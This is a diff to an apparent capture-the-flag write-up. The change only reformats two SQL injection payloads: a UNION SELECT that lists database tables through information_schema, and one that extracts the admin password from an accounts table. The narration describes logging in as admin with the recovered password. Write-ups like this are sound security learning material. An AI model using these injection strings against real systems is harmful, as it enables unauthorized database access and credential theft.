@@ -85,13 +85,16 @@ This proved successful, and after checking the provided cookie, I found it to be
 
 Next, I decided to try and identify the database table(s). After some trial and error, this was accomplished by running the following command: 
 ``` sql
-' UNION SELECT '1', table_name, '3', '4' FROM information_schema.tables WHERE table_schema = database() -- -
+' UNION SELECT '1', table_name, '3', '4' 
+  FROM information_schema.tables 
+  WHERE table_schema = database() -- -
 ```
 After identify the table name, it was then possible to iterate through the column names, allowing me to identify a total of 8 attributes, namely ‘id,username,password,email,USER,HOST,CURRENT_CONNECTIONS, and TOTAL_CONNECTIONS’. 
 
 Knowing the table name, its attributes, and the fact that the admin account is simply called ‘admin’, we can then run this command to retrieve the password: 
 ``` sql
-' UNION SELECT '0', password, '3', '4' FROM accounts LIMIT 1 OFFSET 0 -- -
+' UNION SELECT '0', password, '3', '4' 
+  FROM accounts LIMIT 1 OFFSET 0 -- -
 ```
 With that, I had the admin password, and using it to log in, I was greeted by the congratulatory page marking the end of the CTF!
 
